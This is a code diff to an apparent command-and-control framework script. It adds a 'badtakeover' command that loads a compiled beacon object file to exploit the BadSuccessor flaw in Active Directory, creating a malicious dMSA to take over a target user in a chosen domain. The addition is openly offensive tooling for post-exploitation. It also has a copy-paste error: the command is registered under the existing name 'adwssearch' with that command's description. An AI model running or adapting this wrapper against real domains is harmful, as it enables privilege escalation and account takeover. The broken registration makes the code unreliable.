@@ -26,6 +26,30 @@ cmd_adwssearch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 });
 
 
+
+var cmd_badtakeover = ax.create_command("adwssearch", "Executes ADWS query", "adwssearch (objectClass=*) -attributes *,ntsecuritydescriptor --dc DC1");
+cmd_badtakeover.addArgString("ou",      true, "Target OU to write the malicious dMSA");
+cmd_badtakeover.addArgString("account", true, "The name of the new dMSA to create");
+cmd_badtakeover.addArgString("sid",     true, "The Security ID (SID) of your current context");
+cmd_badtakeover.addArgString("dn",      true, "The target user objects DN");
+cmd_badtakeover.addArgString("domain",  true, "The current domain");
+cmd_badtakeover.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let ou      = parsed_json["ou"];
+    let account = parsed_json["account"];
+    let sid     = parsed_json["sid"];
+    let dn      = parsed_json["dn"];
+    let domain  = parsed_json["domain"];
+
+    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr", [ou, account, sid, dn, domain]);
+    let bof_path = ax.script_dir() + "_bin/badtakeover." + ax.arch(id) + ".o";
+    let message = "Exploiting BadSuccessor...";
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+
+
+
+
 /// LDAPsearch
 
 
@@ -114,7 +138,7 @@ cmd_ldapq.addSubCommands([_cmd_ldapq_computers]);
 
 
 
-var group_exec = ax.create_commands_group("AD-BOF", [cmd_adwssearch, cmd_ldapsearch, cmd_ldapq]);
+var group_exec = ax.create_commands_group("AD-BOF", [cmd_adwssearch, cmd_badtakeover, cmd_ldapsearch, cmd_ldapq]);
 ax.register_commands_group(group_exec, ["beacon", "gopher"], ["windows"], []);
 
 
